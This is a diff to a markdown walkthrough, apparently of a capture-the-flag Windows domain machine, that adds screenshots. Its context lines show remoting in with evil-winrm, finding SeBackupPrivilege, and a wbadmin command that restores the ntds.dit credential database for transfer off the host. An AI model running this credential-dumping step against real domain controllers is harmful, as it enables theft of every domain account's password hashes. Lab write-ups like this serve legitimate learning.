@@ -71,7 +71,7 @@
 
 10. Svc_backup user can PSRemote into the machine, so we evil-winrm into the host and get the user flag!
 
-
+<img width="483" height="216" alt="image" src="https://github.com/user-attachments/assets/8ecebf9b-efc6-4cc3-a7bd-a1b3d79f7a07" />
 
 11. Once we remote in, we do basic enumeration and discover we have the SeBackupPrivilege.
 
@@ -84,6 +84,10 @@
 `wbadmin get versions`
 
 `wbadmin start recovery -quiet -version:09/05/2025-15:31 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoveryTarget:c:\Users\svc_backup\Desktop -notRestoreAcl`
+
+<img width="912" height="702" alt="image" src="https://github.com/user-attachments/assets/301c5b28-279f-4269-8504-3a2789dcc040" />
+
+<img width="910" height="368" alt="image" src="https://github.com/user-attachments/assets/72c1af2c-9fb8-42c6-812d-f22fbccfd82c" />
 
 13. Transfer ntds.dit file onto local machine
 
